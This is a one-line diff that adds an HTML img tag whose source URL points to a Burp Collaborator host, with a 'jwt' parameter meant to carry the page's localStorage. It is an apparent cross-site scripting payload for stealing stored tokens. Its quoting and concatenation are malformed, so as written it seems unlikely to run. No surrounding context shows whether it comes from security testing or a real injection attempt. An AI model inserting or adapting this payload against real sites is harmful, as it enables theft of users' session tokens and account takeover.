@@ -1,0 +1,1 @@
+<img src=’https://222keouob2vgf5m790bi08ekkbq4et.burpcollaborator.net/yikes?jwt=’+JSON.stringify(localStorage);’--!>
